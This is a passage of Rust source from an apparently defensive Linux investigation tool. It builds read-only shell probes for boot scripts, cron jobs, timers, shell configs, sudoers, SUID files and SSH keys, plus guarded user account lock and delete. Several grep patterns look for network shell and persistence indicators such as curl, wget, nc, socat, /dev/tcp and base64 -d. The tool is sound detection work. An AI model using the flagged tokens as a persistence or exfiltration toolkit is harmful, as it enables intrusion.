        StartupInvestigationAction::StartupType => format!(
            "printf 'Boot links\\n'; {SCRIPT_BOOT_LINKS}; if command -v rc-update >/dev/null 2>&1; then printf '\\nrc-update\\n'; msg='Not listed by rc-update'; m=$(rc-update show 2>/dev/null | grep -F -- \"$n\" | head -n 20); {SHOW_MSG}; fi; if command -v chkconfig >/dev/null 2>&1; then printf '\\nchkconfig\\n'; msg='Not listed by chkconfig'; m=$(chkconfig --list \"$n\" 2>/dev/null); {SHOW_MSG}; fi"
        ),
        StartupInvestigationAction::ConfigLocation => format!(
            "printf 'Script\\t%s\\n\\nSettings files\\n' \"$p\"; msg='No settings file'; m=$({SCRIPT_CONFIG_FILES}); {SHOW_MSG}; printf '\\nBoot links\\n'; {SCRIPT_BOOT_LINKS}"
        ),
        StartupInvestigationAction::SuspiciousPath => format!(
            "printf 'Script path\\t%s\\n' \"$p\"; case \"$p\" in /etc/init.d/*|/etc/rc.d/init.d/*|/etc/rc.d/*) printf 'Location\\tinside a standard boot script directory\\n';; *) printf 'Location\\tOUTSIDE the standard boot script directories\\n';; esac; {SCRIPT_STAT}; printf '\\nHigh-signal tokens in the script\\n'; msg='No high-signal suspicious path token matched'; m=$(grep -nE '(/tmp/|/var/tmp/|/dev/shm/|/home/|curl[[:space:]]|wget[[:space:]]|nc[[:space:]]|ncat[[:space:]]|bash[[:space:]]+-c|sh[[:space:]]+-c)' < \"$p\" 2>/dev/null | head -n 60); {SHOW_MSG}"
        ),
        StartupInvestigationAction::FileSignature => {
            "printf 'Path\\t%s\\n' \"$p\"; printf 'SHA256\\t%s\\n' \"$(sha256sum -- \"$p\" 2>/dev/null | awk '{print $1}')\"; if command -v file >/dev/null 2>&1; then printf 'Type\\t%s\\n' \"$(file -b -- \"$p\" 2>/dev/null)\"; fi; printf 'First line\\t%s\\n' \"$(head -n 1 < \"$p\" 2>/dev/null)\"".to_owned()
        }
        StartupInvestigationAction::ModificationTime => format!(
            "for f in \"$p\" \"/etc/default/$n\" \"/etc/conf.d/$n\" \"/etc/sysconfig/$n\"; do [ -e \"$f\" ] || continue; stat -c '%n|%y|%A|%U:%G' -- \"$f\" 2>/dev/null; done | awk -F'|' '{{printf \"%s\\n  modified %s\\n  mode %s owner %s\\n\", $1, $2, $3, $4}}'; printf '\\nBoot links\\n'; {SCRIPT_BOOT_LINKS_STAT}"
        ),
        StartupInvestigationAction::MalwareIndicators => format!(
            "msg='No high-signal malicious token matched'; m=$(grep -inE '(curl|wget|/dev/tcp|base64[[:space:]]+-d|LD_PRELOAD|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e|chattr|history[[:space:]]+-c|crontab[[:space:]]+-)' < \"$p\" 2>/dev/null | head -n 100); {SHOW_MSG}"
        ),
        StartupInvestigationAction::Dependencies => format!(
            "printf 'LSB header\\n'; msg='No LSB dependency header'; m=$({LSB_HEADER} | grep -E '(Provides|Required-Start|Required-Stop|Should-Start|Should-Stop|Default-Start|Default-Stop)'); {SHOW_MSG}; printf '\\nOpenRC depend()\\n'; msg='No OpenRC depend block'; m=$({OPENRC_DEPEND}); {SHOW_MSG}"
        ),
        StartupInvestigationAction::BootOrder => format!(
            "printf 'Boot links, in the order the runlevel runs them\\n'; {SCRIPT_BOOT_LINKS}; printf '\\nNeighbours in the same runlevel\\n'; {{ {SCRIPT_BOOT_LINK_PATHS} }} | while IFS= read -r l; do d=${{l%/*}}; printf '== %s\\n' \"$d\"; ls -1 \"$d\" 2>/dev/null | head -n 60; done"
        ),
        StartupInvestigationAction::StartupLogs => {
            format!(
                "logs=0; for f in {SCRIPT_LOG_FILES}; do [ -r \"$f\" ] || continue; logs=1; printf '== %s\\n' \"$f\"; grep -F -- \"$n\" \"$f\" 2>/dev/null | tail -n 100; done; [ \"$logs\" = 1 ] || printf 'No readable system log file on this host\\n'"
            )
        }
        StartupInvestigationAction::ErrorLogs => {
            format!(
                "logs=0; for f in {SCRIPT_LOG_FILES}; do [ -r \"$f\" ] || continue; logs=1; printf '== %s\\n' \"$f\"; grep -F -- \"$n\" \"$f\" 2>/dev/null | grep -iE '(error|fail|denied|refus|cannot|unable|fatal|segfault)' | tail -n 100; done; [ \"$logs\" = 1 ] || printf 'No readable system log file on this host\\n'"
            )
        }
        StartupInvestigationAction::RunHistory => {
            format!(
                "logs=0; for f in {SCRIPT_LOG_FILES}; do [ -r \"$f\" ] || continue; logs=1; printf '== %s\\n' \"$f\"; grep -F -- \"$n\" \"$f\" 2>/dev/null | grep -iE '(start|stop|restart|reload|exit|kill|terminat)' | tail -n 100; done; [ \"$logs\" = 1 ] || printf 'No readable system log file on this host\\n'"
            )
        }
        StartupInvestigationAction::ConfigSummary => format!(
            "printf 'Name\\t%s\\nScript\\t%s\\n' \"$n\" \"$p\"; {SCRIPT_STAT}; printf '\\nBoot links\\n'; {SCRIPT_BOOT_LINKS}; printf '\\nSettings files\\n'; msg='No settings file'; m=$({SCRIPT_CONFIG_FILES}); {SHOW_MSG}; printf '\\nScript\\n'; head -n 200 < \"$p\" 2>/dev/null"
        ),
        // Refused before the menu can offer them; kept exhaustive so a new
        // action has to decide which side it is on.
        StartupInvestigationAction::BootTime | StartupInvestigationAction::ResourceUsage => {
            return Err(CoreError::validation(
                "boot script investigation",
                "this question is only answerable for a systemd unit",
            ));
        }
    };
    Ok(format!("n={}; p={}; {probe}; :", shq(name), shq(&path)))
}

fn cron_investigation_command(
    username: &str,
    schedule: &str,
    command: &str,
    source: &str,
    action: CronInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_username(username) {
        return Err(invalid_detail_key("cron username"));
    }
    let schedule = validated_cron_schedule(schedule)?;
    let command = validated_inert_command(command)?;
    let source = validated_cron_source(source)?;
    let probe = match action {
        CronInvestigationAction::ViewSource => {
            "nl -ba -- \"$src\" 2>/dev/null | head -n 1000 || printf 'Cron source is unreadable\\n'"
        }
        CronInvestigationAction::Details => {
            "printf 'User\\t%s\\nSchedule\\t%s\\nCommand\\t%s\\nSource\\t%s\\n' \"$user\" \"$sched\" \"$cmd\" \"$src\"; stat -c 'Owner\\t%U:%G%nMode\\t%A (%a)%nModified\\t%y%nSize\\t%s' -- \"$src\" 2>/dev/null"
        }
        CronInvestigationAction::Schedule => {
            "printf 'Cron schedule\\t%s\\nTarget timezone\\t%s\\nTarget time\\t%s\\n' \"$sched\" \"$(date +%Z 2>/dev/null)\" \"$(date --iso-8601=seconds 2>/dev/null)\""
        }
        CronInvestigationAction::Command => {
            "printf 'Command is displayed as inert text and is not executed.\\n%s\\n' \"$cmd\""
        }
        CronInvestigationAction::ViewCrontab => {
            "grep -FnF -- \"$cmd\" \"$src\" 2>/dev/null | head -n 100 || printf 'Exact command text is no longer present in the source file\\n'"
        }
        CronInvestigationAction::ExecutionLogs => {
            "for f in /var/log/cron /var/log/cron.log /var/log/syslog /var/log/messages; do [ -r \"$f\" ] || continue; grep -F -- \"$user\" \"$f\" 2>/dev/null | grep -F -- \"$cmd\" | tail -n 100; done"
        }
        CronInvestigationAction::RecentRuns => {
            "journalctl -t CRON -t CROND -u cron -u crond --no-pager -n 1000 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        CronInvestigationAction::ErrorLogs => {
            "journalctl -t CRON -t CROND -u cron -u crond -p err --no-pager -n 300 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        CronInvestigationAction::ParseSchedule => {
            "printf '%s\\n' \"$sched\" | awk '{printf \"Minute\\t%s\\nHour\\t%s\\nDay of month\\t%s\\nMonth\\t%s\\nDay of week\\t%s\\n\",$1,$2,$3,$4,$5}'"
        }
        CronInvestigationAction::NextRun => {
            r#"if printf '%s' "$sched" | grep -q '[A-Za-z]'; then printf 'Named month or weekday schedules are not evaluated locally; expression remains read-only: %s\n' "$sched"; else awk -v spec="$sched" '
function field(v,s,min,max, n,parts,i,pair,base,step,bounds,lo,hi) {
    n=split(s,parts,",");
    for (i=1;i<=n;i++) {
        base=parts[i]; step=1;
        if (index(base,"/")) { split(base,pair,"/"); base=pair[1]; step=pair[2]+0; }
        if (step<1) continue;
        if (base=="*") { lo=min; hi=max; }
        else if (index(base,"-")) { split(base,bounds,"-"); lo=bounds[1]+0; hi=bounds[2]+0; }
        else { lo=base+0; hi=lo; }
        if (lo<min || hi>max || lo>hi) continue;
        if (v>=lo && v<=hi && ((v-lo)%step)==0) return 1;
    }
    return 0;
}
BEGIN {
    split(spec,f," "); start=systime(); start=start-(start%60)+60;
    dom_star=(f[3]=="*"); dow_star=(f[5]=="*");
    for (i=0;i<527040;i++) {
        t=start+i*60; minute=strftime("%M",t)+0; hour=strftime("%H",t)+0;
        dom=strftime("%d",t)+0; month=strftime("%m",t)+0; dow=strftime("%w",t)+0;
        dom_hit=field(dom,f[3],1,31); dow_hit=field(dow,f[5],0,7) || (dow==0 && field(7,f[5],0,7));
        day_hit=(dom_star || dow_star) ? (dom_hit && dow_hit) : (dom_hit || dow_hit);
        if (field(minute,f[1],0,59) && field(hour,f[2],0,23) && day_hit && field(month,f[4],1,12)) {
            printf "Next numeric match\t%s\n", strftime("%Y-%m-%d %H:%M:%S %Z",t); exit;
        }
    }
    print "No numeric match was found within 366 days";
}' /dev/null; fi"#
        }
        CronInvestigationAction::Frequency => {
            r#"awk -v s="$sched" 'BEGIN {split(s,f," "); printf "Expression\t%s\n",s; if (s=="* * * * *") print "Frequency\tEvery minute"; else if (f[1] ~ /^\*\/[0-9]+$/ && f[2]=="*") print "Frequency\tMinute interval within every hour"; else if (f[1] !~ /[*,-\/]/ && f[2]=="*") print "Frequency\tOnce per hour"; else if (f[1] !~ /[*,-\/]/ && f[2] !~ /[*,-\/]/ && f[3]=="*" && f[4]=="*" && f[5]=="*") print "Frequency\tOnce per day"; else print "Frequency\tCompound cron schedule; use the next-match preview"}'"#
        }
        CronInvestigationAction::SecurityCheck => {
            "printf 'Command is not executed. High-signal tokens:\\n'; printf '%s\\n' \"$cmd\" | grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|chmod[[:space:]]+[+]?[su]|chattr|LD_PRELOAD|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e|rm[[:space:]]+-rf)' || printf 'No high-signal token matched\\n'"
        }
        CronInvestigationAction::PathCheck => {
            "first=$(printf '%s\\n' \"$cmd\" | awk '{for(i=1;i<=NF;i++){if($i ~ /^[A-Za-z_][A-Za-z0-9_]*=/) continue; if($i==\"sudo\" || $i==\"env\") continue; print $i; exit}}'); printf 'First executable token\\t%s\\n' \"$first\"; case \"$first\" in /*) path=\"$first\";; -*|'') path='';; *) path=$(command -v \"$first\" 2>/dev/null || true);; esac; case \"$path\" in /*) stat -c 'Resolved path\\t%n%nMode\\t%A (%a)%nOwner\\t%U:%G%nModified\\t%y' -- \"$path\" 2>/dev/null; sha256sum -- \"$path\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}';; *) printf 'Executable could not be resolved without running the task\\n';; esac"
        }
        CronInvestigationAction::SuspiciousCheck => {
            "printf 'Source file\\n'; stat -c '%n\\t%A (%a)\\t%U:%G\\t%y' -- \"$src\" 2>/dev/null; printf '\\nCommand indicators\\n'; printf '%s\\n' \"$cmd\" | grep -Ein '(/tmp/|/dev/shm/|curl|wget|base64|nohup|setsid|LD_PRELOAD|/dev/tcp|nc[[:space:]]|socat)' || printf 'No high-signal persistence token matched\\n'"
        }
        CronInvestigationAction::ExportRecord => {
            "printf 'user\\t%s\\nschedule\\t%s\\ncommand\\t%s\\nsource\\t%s\\n' \"$user\" \"$sched\" \"$cmd\" \"$src\""
        }
    };
    Ok(format!(
        "user={}; sched={}; cmd={}; src={}; {probe}; :",
        shq(username),
        shq(&schedule),
        shq(&command),
        shq(&source),
    ))
}

fn timer_investigation_command(
    timer: &str,
    trigger: &str,
    action: TimerInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_timer_unit(timer) || !is_valid_unit_name(trigger) {
        return Err(invalid_detail_key("systemd timer identity"));
    }
    let probe = match action {
        TimerInvestigationAction::TimerStatus => {
            "systemctl status \"$t\" --no-pager -l 2>/dev/null || true; printf '\\nTimer properties\\n'; systemctl show \"$t\" --no-pager -p ActiveState -p SubState -p UnitFileState -p NextElapseUSecRealtime -p LastTriggerUSec -p Triggers 2>/dev/null"
        }
        TimerInvestigationAction::TimerConfig => {
            "systemctl cat \"$t\" --no-pager 2>/dev/null || printf 'Timer configuration is unavailable\\n'"
        }
        TimerInvestigationAction::UnitStatus => {
            "systemctl status \"$g\" --no-pager -l 2>/dev/null || true; systemctl show \"$g\" --no-pager -p ActiveState -p SubState -p Result -p ExecMainStatus -p FragmentPath 2>/dev/null"
        }
        TimerInvestigationAction::UnitConfig => {
            "systemctl cat \"$g\" --no-pager 2>/dev/null || printf 'Triggered unit configuration is unavailable\\n'"
        }
        TimerInvestigationAction::TimerLogs => {
            "journalctl -u \"$t\" --no-pager -n 200 2>/dev/null || printf 'No timer log is available\\n'"
        }
        TimerInvestigationAction::UnitLogs => {
            "journalctl -u \"$g\" --no-pager -n 200 2>/dev/null || printf 'No triggered-unit log is available\\n'"
        }
    };
    Ok(format!("t={}; g={}; {probe}; :", shq(timer), shq(trigger)))
}

fn shell_config_investigation_command(
    path: &str,
    line: u32,
    action: ShellConfigInvestigationAction,
) -> CoreResult<String> {
    let path = validated_shell_config_path(path)?;
    if !(1..=10_000_000).contains(&line) {
        return Err(invalid_detail_key("shell configuration line"));
    }
    let probe = match action {
        ShellConfigInvestigationAction::ViewContext => {
            "start=$((line>10 ? line-10 : 1)); end=$((line+10)); nl -ba -- \"$p\" 2>/dev/null | sed -n \"${start},${end}p\""
        }
        ShellConfigInvestigationAction::ViewFile => {
            "nl -ba -- \"$p\" 2>/dev/null | head -n 1000 || printf 'Shell configuration is unreadable\\n'"
        }
        ShellConfigInvestigationAction::Permissions => {
            "stat -c 'Path\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y%nChanged\\t%z%nSize\\t%s' -- \"$p\" 2>/dev/null; if command -v getfacl >/dev/null 2>&1; then printf '\\nACL\\n'; getfacl -p -- \"$p\" 2>/dev/null | head -n 200; fi"
        }
        ShellConfigInvestigationAction::History => {
            "stat -c 'Current file\\nPath\\t%n%nBirth\\t%w%nModified\\t%y%nChanged\\t%z%nInode\\t%i%nSize\\t%s' -- \"$p\" 2>/dev/null; dir=$(dirname -- \"$p\"); base=$(basename -- \"$p\"); printf '\\nNearby backup candidates\\n'; find \"$dir\" -maxdepth 1 -type f -name \"$base*\" -exec stat -c '%y|%a|%U:%G|%n' {} + 2>/dev/null | awk -F'|' '{w=substr($1,1,19); sub(\" \",\"T\",w); p=$4; for(i=5;i<=NF;i++) p=p \"|\" $i; printf \"%s\\t%s\\t%s\\t%s\\n\", w, $2, $3, p}' | sort -r | head -n 100"
        }
        ShellConfigInvestigationAction::SuspiciousLines => {
            "grep -Ein '(curl|wget|/dev/tcp|base64[[:space:]]+-d|LD_PRELOAD|PROMPT_COMMAND|BASH_ENV|ENV=|/tmp/|/dev/shm/|nc[[:space:]]|ncat[[:space:]]|socat|python[^[:space:]]*[[:space:]]+-c|perl[[:space:]]+-e)' -- \"$p\" 2>/dev/null | head -n 200 || printf 'No high-signal suspicious line matched\\n'"
        }
        ShellConfigInvestigationAction::OwnerCheck => {
            "uid=$(stat -c '%u' -- \"$p\" 2>/dev/null); gid=$(stat -c '%g' -- \"$p\" 2>/dev/null); owner=$(getent passwd \"$uid\" 2>/dev/null | cut -d: -f1); group=$(getent group \"$gid\" 2>/dev/null | cut -d: -f1); printf 'UID\\t%s\\nUser\\t%s\\nGID\\t%s\\nGroup\\t%s\\n' \"$uid\" \"${owner:-unknown}\" \"$gid\" \"${group:-unknown}\"; [ -n \"$owner\" ] && id \"$owner\" 2>/dev/null || true"
        }
    };
    Ok(format!("p={}; line={line}; {probe}; :", shq(&path)))
}

fn sudoers_investigation_command(
    principal: &str,
    username: Option<&str>,
    source: &str,
    action: SudoersInvestigationAction,
) -> CoreResult<String> {
    let principal = validated_sudo_principal(principal)?;
    let source = validated_sudoers_source(source)?;
    let username = match username {
        Some(username) if is_valid_username(username) => Some(username),
        Some(_) => return Err(invalid_detail_key("sudoers username")),
        None => None,
    };
    if action.requires_username() && username.is_none() {
        return Err(CoreError::validation(
            "sudoers investigation",
            "the selected principal is not a concrete Linux username",
        ));
    }
    let probe = match action {
        SudoersInvestigationAction::ViewSudoers => {
            "nl -ba /etc/sudoers 2>/dev/null | head -n 1000 || printf '/etc/sudoers is unreadable\\n'"
        }
        SudoersInvestigationAction::ViewSource => {
            "nl -ba -- \"$src\" 2>/dev/null | head -n 1000 || printf 'Sudoers source is unreadable\\n'"
        }
        SudoersInvestigationAction::SyntaxCheck => {
            "if command -v visudo >/dev/null 2>&1; then visudo -c -f \"$src\" 2>&1 | head -n 200; else printf 'visudo is unavailable\\n'; fi"
        }
        SudoersInvestigationAction::ListDropIns => {
            "find /etc/sudoers.d -maxdepth 1 -type f -exec stat -c '%a|%U:%G|%y|%n' {} + 2>/dev/null | awk -F'|' '{w=substr($3,1,19); sub(\" \",\"T\",w); p=$4; for(i=5;i<=NF;i++) p=p \"|\" $i; printf \"%s\\t%s\\t%s\\t%s\\n\", $1, $2, w, p}' | sort | head -n 300"
        }
        SudoersInvestigationAction::UserPermissions => {
            "if command -v sudo >/dev/null 2>&1; then sudo -n -l -U \"$user\" 2>&1 | head -n 500; else printf 'sudo is unavailable\\n'; fi"
        }
        SudoersInvestigationAction::UserHistory => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$user\" \"$f\" 2>/dev/null | grep -F 'sudo' | tail -n 100; done; journalctl _COMM=sudo --no-pager -n 1000 2>/dev/null | grep -F -- \"$user\" | tail -n 100 || true"
        }
        SudoersInvestigationAction::UserGroups => {
            "getent passwd \"$user\" 2>/dev/null || true; id \"$user\" 2>/dev/null || printf 'User no longer exists\\n'"
        }
        SudoersInvestigationAction::FindNoPassword => {
            "for f in /etc/sudoers /etc/sudoers.d/*; do [ -f \"$f\" ] || continue; grep -HnE '^[[:space:]]*[^#].*NOPASSWD' -- \"$f\" 2>/dev/null; done | head -n 500"
        }
    };
    Ok(format!(
        "principal={}; user={}; src={}; {probe}; :",
        shq(&principal),
        shq(username.unwrap_or("")),
        shq(&source),
    ))
}

fn suid_file_investigation_command(
    path: &str,
    action: SuidFileInvestigationAction,
) -> CoreResult<String> {
    let path = validated_absolute_path(path)?;
    if action == SuidFileInvestigationAction::Details {
        return Ok(file_detail_command(&path));
    }
    let probe = match action {
        SuidFileInvestigationAction::Details => unreachable!("handled above"),
        SuidFileInvestigationAction::FileType => {
            "file -L -- \"$p\" 2>/dev/null; readelf -h -- \"$p\" 2>/dev/null | head -n 80 || true"
        }
        SuidFileInvestigationAction::Hash => {
            "sha256sum -- \"$p\" 2>/dev/null | awk '{print \"SHA256\\t\"$1}'; md5sum -- \"$p\" 2>/dev/null | awk '{print \"MD5\\t\"$1}'"
        }
        SuidFileInvestigationAction::Strings => {
            "if command -v strings >/dev/null 2>&1; then strings -a -n 6 -- \"$p\" 2>/dev/null | grep -Ein '(/bin/(sh|bash)|system\\(|popen\\(|execve|setuid|setgid|/tmp/|/dev/shm/|LD_PRELOAD|curl|wget|socket|connect)' | head -n 300 || printf 'No high-signal string matched\\n'; else printf 'strings is unavailable\\n'; fi"
        }
        SuidFileInvestigationAction::Package => {
            "if command -v dpkg-query >/dev/null 2>&1; then dpkg-query -S -- \"$p\" 2>/dev/null || printf 'No dpkg owner found\\n'; elif command -v rpm >/dev/null 2>&1; then rpm -qf -- \"$p\" 2>/dev/null || printf 'No RPM owner found\\n'; else printf 'No supported package database is available\\n'; fi"
        }
        SuidFileInvestigationAction::Integrity => {
            "if command -v dpkg-query >/dev/null 2>&1; then pkg=$(dpkg-query -S -- \"$p\" 2>/dev/null | head -n 1 | cut -d: -f1); if [ -n \"$pkg\" ]; then out=$(dpkg --verify \"$pkg\" 2>/dev/null | grep -F -- \"$p\" | head -n 100); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No dpkg verification mismatch reported for this path\\n'; else printf 'No dpkg owner found\\n'; fi; elif command -v rpm >/dev/null 2>&1; then pkg=$(rpm -qf -- \"$p\" 2>/dev/null); if [ -n \"$pkg\" ]; then out=$(rpm -V \"$pkg\" 2>/dev/null | grep -F -- \"$p\" | head -n 100); [ -n \"$out\" ] && printf '%s\\n' \"$out\" || printf 'No RPM verification mismatch reported for this path\\n'; else printf 'No RPM owner found\\n'; fi; else printf 'No supported package database is available\\n'; fi"
        }
        SuidFileInvestigationAction::Capabilities => {
            "if command -v getcap >/dev/null 2>&1; then getcap -n -- \"$p\" 2>/dev/null || true; else printf 'getcap is unavailable\\n'; fi; printf 'Mode and owner\\n'; stat -c '%A (%a)\\t%U:%G\\t%n' -- \"$p\" 2>/dev/null"
        }
        SuidFileInvestigationAction::Links => {
            "printf 'Canonical path\\t%s\\n' \"$(readlink -f -- \"$p\" 2>/dev/null)\"; \
            printf 'Link count\\t%s\\n' \"$(stat -c '%h' -- \"$p\" 2>/dev/null)\"; \
            printf 'Links in executable inventories\\n'; find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -xdev -samefile \"$p\" -print 2>/dev/null | head -n 300"
        }
    };
    Ok(format!("p={}; {probe}; :", shq(&path)))
}

fn ssh_key_investigation_command(
    username: &str,
    key_type: &str,
    key_content: &str,
    path: &str,
    action: SshKeyInvestigationAction,
) -> CoreResult<String> {
    if !is_valid_username(username) {
        return Err(invalid_detail_key("SSH key owner"));
    }
    if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
        return Err(invalid_detail_key("SSH public key"));
    }
    let path = validated_authorized_keys_path(path)?;
    let probe = match action {
        SshKeyInvestigationAction::AuthorizedKeys => {
            "nl -ba -- \"$f\" 2>/dev/null | head -n 1000 || printf 'authorized_keys is unreadable\\n'"
        }
        SshKeyInvestigationAction::Fingerprint => {
            "if command -v ssh-keygen >/dev/null 2>&1; then printf '%s %s\\n' \"$kt\" \"$kc\" | ssh-keygen -lf - 2>/dev/null || printf 'Public key fingerprint could not be parsed\\n'; else printf 'ssh-keygen is unavailable\\n'; fi"
        }
        SshKeyInvestigationAction::Permissions => {
            "dir=$(dirname -- \"$f\"); stat -c 'File\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y' -- \"$f\" 2>/dev/null; printf '\\nDirectory\\n'; stat -c 'Path\\t%n%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nMode\\t%A (%a)%nModified\\t%y' -- \"$dir\" 2>/dev/null"
        }
        SshKeyInvestigationAction::SshDirectory => {
            "dir=$(dirname -- \"$f\"); stat -c 'Directory\\t%n%nOwner\\t%U:%G%nMode\\t%A (%a)%nModified\\t%y' -- \"$dir\" 2>/dev/null; printf '\\nDirectory entries\\n'; find \"$dir\" -maxdepth 1 -mindepth 1 -exec stat -c '%a|%U:%G|%y|%n' {} + 2>/dev/null | awk -F'|' '{w=substr($3,1,19); sub(\" \",\"T\",w); p=$4; for(i=5;i<=NF;i++) p=p \"|\" $i; sub(\".*/\",\"\",p); printf \"%s\\t%s\\t%s\\t%s\\n\", $1, $2, w, p}' 2>/dev/null | sort | head -n 300"
        }
        SshKeyInvestigationAction::KeyAge => {
            "stat -c 'Path\\t%n%nBirth\\t%w%nModified\\t%y%nChanged\\t%z%nOwner\\t%U:%G%nMode\\t%A (%a)' -- \"$f\" 2>/dev/null; printf 'Target time\\t%s\\n' \"$(date --iso-8601=seconds 2>/dev/null)\""
        }
        SshKeyInvestigationAction::AllUserKeys => {
            "for path in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -r \"$path\" ] || continue; owner=$(stat -c '%U' -- \"$path\" 2>/dev/null); awk -v owner=\"$owner\" -v path=\"$path\" 'NF>=2 && $1 !~ /^#/ {print owner\"\\t\"$1\"\\t\"$2\"\\t\"path}' \"$path\"; done | head -n 500"
        }
        SshKeyInvestigationAction::SshdConfig => {
            "printf 'Effective public-key settings\\n'; if command -v sshd >/dev/null 2>&1; then sshd -T 2>/dev/null | grep -E '^(pubkeyauthentication|authorizedkeysfile|permitrootlogin|strictmodes|authenticationmethods)[[:space:]]' || true; else printf 'sshd is unavailable\\n'; fi; printf '\\nConfigured directives\\n'; grep -HnEi '^[[:space:]]*(PubkeyAuthentication|AuthorizedKeysFile|PermitRootLogin|StrictModes|AuthenticationMethods)[[:space:]]' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null | head -n 300"
        }
    };
    Ok(format!(
        "owner={}; kt={}; kc={}; f={}; {probe}; :",
        shq(username),
        shq(key_type),
        shq(key_content),
        shq(&path),
    ))
}

/// `passwd -S` on another account needs root, so a non-root session asks
/// `sudo -n` exactly as the change itself does; without it every lock, unlock
/// and delete failed at the plan for an operator logged in as an ordinary
/// sudoer, because the empty status read as an invalid snapshot. An empty
/// status is now a failed read (exit 45), not a state.
///
/// The session account is the name sshd logged in (`LOGNAME`/`USER`), with
/// `id -un` only as a fallback: when a second account shares UID 0, `id -un`
/// names whichever of the two comes first in /etc/passwd, so it cannot tell
/// "logged in as root" from "logged in as the backdoor".
fn user_account_snapshot_command(username: &str) -> String {
    let username = shq(username);
    format!(
        "u={username}; line=$(getent passwd \"$u\" 2>/dev/null) || {{ printf 'ABSENT\\n'; exit 44; }}; if [ \"$(id -u)\" -eq 0 ]; then run=; else run='sudo -n'; fi; state=$($run passwd -S \"$u\" 2>/dev/null | awk '{{print $2}}'); [ -n \"$state\" ] || exit 45; current=${{LOGNAME:-${{USER:-}}}}; [ -n \"$current\" ] || current=$(id -un 2>/dev/null) || exit 46; printf '%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n' \"$(printf '%s' \"$line\" | cut -d: -f1)\" \"$(printf '%s' \"$line\" | cut -d: -f3)\" \"$(printf '%s' \"$line\" | cut -d: -f4)\" \"$(printf '%s' \"$line\" | cut -d: -f6)\" \"$(printf '%s' \"$line\" | cut -d: -f7)\" \"$state\" \"$current\""
    )
}

fn parse_user_account_snapshot(output: &str) -> CoreResult<UserAccountSnapshot> {
    let fields = output.trim_end().split('\t').collect::<Vec<_>>();
    if fields.len() != 7 || !is_valid_username(fields[0]) || !is_valid_username(fields[6]) {
        return Err(invalid_detail_key("user account snapshot"));
    }
    let parse_id = |value: &str, subject: &'static str| -> CoreResult<u32> {
        value
            .parse::<u32>()
            .map_err(|_| invalid_detail_key(subject))
    };
    let password_state = match fields[5] {
        "L" | "LK" | "NL" => UserPasswordState::Locked,
        "P" | "PS" => UserPasswordState::PasswordSet,
        "NP" => UserPasswordState::NoPassword,
        _ => return Err(invalid_detail_key("user password state")),
    };
    Ok(UserAccountSnapshot {
        username: fields[0].to_owned(),
        uid: parse_id(fields[1], "user UID")?,
        gid: parse_id(fields[2], "user GID")?,
        home: validated_absolute_path(fields[3])?,
        shell: if fields[4].is_empty() {
            String::new()
        } else {
            validated_absolute_path(fields[4])?
        },
        password_state,
        session_username: fields[6].to_owned(),
    })
}

fn validate_user_account_precondition(
    snapshot: &UserAccountSnapshot,
    action: UserAccountAction,
) -> CoreResult<()> {
    if action == UserAccountAction::Delete {
        // Read from the target, not the table: the row could be stale, and the
        // session account is only known here.
        let refusal = if snapshot.username == "root" {
            Some((USER_ACCOUNT_ROOT_REFUSAL, "the root account is not deleted"))
        } else if snapshot.username == snapshot.session_username {
            Some((
                USER_ACCOUNT_SESSION_REFUSAL,
                "this is the account the SSH session is logged in as",
            ))
        } else {
            None
        };
        return match refusal {
            None => Ok(()),
            Some((subject, reason)) => Err(CoreError::validation(
                subject,
                format!("{} cannot be deleted: {reason}", snapshot.username),
            )),
        };
    }
    let valid = match action {
        UserAccountAction::Lock => snapshot.password_state != UserPasswordState::Locked,
        UserAccountAction::Unlock => snapshot.password_state == UserPasswordState::Locked,
        UserAccountAction::Delete => unreachable!("handled above"),
    };
    if valid {
        Ok(())
    } else {
        Err(CoreError::validation(
            USER_ACCOUNT_STATE_REFUSAL,
            format!(
                "{} cannot be {} from password state {}",
                snapshot.username,
                action.label(),
                snapshot.password_state.label(),
            ),
        ))
    }
}

fn user_account_action_verified(snapshot: &UserAccountSnapshot, action: UserAccountAction) -> bool {
    match action {
        UserAccountAction::Lock => snapshot.password_state == UserPasswordState::Locked,
        UserAccountAction::Unlock => snapshot.password_state != UserPasswordState::Locked,
        // An account that can still be read was not deleted.
        UserAccountAction::Delete => false,
    }
}

fn same_user_account_identity(left: &UserAccountSnapshot, right: &UserAccountSnapshot) -> bool {
    left.username == right.username
        && left.uid == right.uid
        && left.gid == right.gid
        && left.home == right.home
        && left.shell == right.shell
        && left.session_username == right.session_username
}

fn user_account_command(username: &str, action: UserAccountAction) -> String {
    let username = shq(username);
    let Some(flag) = action.passwd_flag() else {
        return user_account_delete_command(&username, false);
    };
    format!(
        "u={username}; if [ \"$(id -u)\" -eq 0 ]; then passwd {flag} \"$u\"; elif command -v sudo >/dev/null 2>&1; then sudo -n passwd {flag} \"$u\"; else printf 'Root privileges are required\\n' >&2; exit 77; fi",
    )
}

/// `userdel` where shadow-utils is installed, BusyBox `deluser` where it is
/// not (Alpine and other small images). Neither is given the flag that removes
/// the home directory. `username` is already shell-quoted.
///
/// For an ordinary account `userdel -f` is never used: if it still has
/// processes running, userdel refuses and that refusal is the answer. A second
/// UID 0 account is the exception that needs it: userdel looks for "its"
/// processes by UID, finds every one of root's, and would refuse forever.
